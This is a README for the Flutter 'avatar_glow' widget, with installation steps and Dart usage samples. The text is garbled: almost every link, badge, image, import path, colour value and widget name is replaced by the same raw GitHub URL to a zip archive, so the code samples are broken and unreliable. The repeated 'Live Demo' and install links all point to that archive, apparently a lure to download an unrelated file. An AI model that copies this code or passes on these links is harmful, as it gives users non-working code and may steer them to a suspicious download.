Live Demo: [https://raw.githubusercontent.com/sawel24/avatar_glow/master/hueless/avatar_glow.zip](https://raw.githubusercontent.com/sawel24/avatar_glow/master/hueless/avatar_glow.zip)

# üíª Installation
In the `dependencies:` section of your `https://raw.githubusercontent.com/sawel24/avatar_glow/master/hueless/avatar_glow.zip`, add the following line:

[![Version](https://raw.githubusercontent.com/sawel24/avatar_glow/master/hueless/avatar_glow.zip)](https://raw.githubusercontent.com/sawel24/avatar_glow/master/hueless/avatar_glow.zip)

```yaml
dependencies:
  avatar_glow: <latest version>
```

# ‚ùî Usage

### Import this class

```dart
import 'https://raw.githubusercontent.com/sawel24/avatar_glow/master/hueless/avatar_glow.zip';
```

Usage is simple. Avatar Glow is a widget offering different customizable optional parameters with child displayed at its center.

<img src="https://raw.githubusercontent.com/sawel24/avatar_glow/master/hueless/avatar_glow.zip"  height = "400" alt="PieChart">


### - Simple Implementation
```dart
AvatarGlow(
 endRadius: 60.0,
 child: Material(     // Replace this child with your own
   elevation: 8.0,
   shape: CircleBorder(),
   child: CircleAvatar(
     backgroundColor: https://raw.githubusercontent.com/sawel24/avatar_glow/master/hueless/avatar_glow.zip[100],
     child: https://raw.githubusercontent.com/sawel24/avatar_glow/master/hueless/avatar_glow.zip(
       'https://raw.githubusercontent.com/sawel24/avatar_glow/master/hueless/avatar_glow.zip',
       height: 50,
     ),
     radius: 30.0,
   ),
 ),
),
```

### - Full Implementation
```dart
AvatarGlow(
 glowColor: https://raw.githubusercontent.com/sawel24/avatar_glow/master/hueless/avatar_glow.zip,
 endRadius: 90.0,
 duration: Duration(milliseconds: 2000),
 repeat: true,
 showTwoGlows: true,
 repeatPauseDuration: Duration(milliseconds: 100),
 child: Material(     // Replace this child with your own
   elevation: 8.0,
   shape: CircleBorder(),
   child: CircleAvatar(
     backgroundColor: https://raw.githubusercontent.com/sawel24/avatar_glow/master/hueless/avatar_glow.zip[100],
     child: https://raw.githubusercontent.com/sawel24/avatar_glow/master/hueless/avatar_glow.zip(
       'https://raw.githubusercontent.com/sawel24/avatar_glow/master/hueless/avatar_glow.zip',
       height: 60,
     ),
     radius: 40.0,
   ),
 ),
),
```
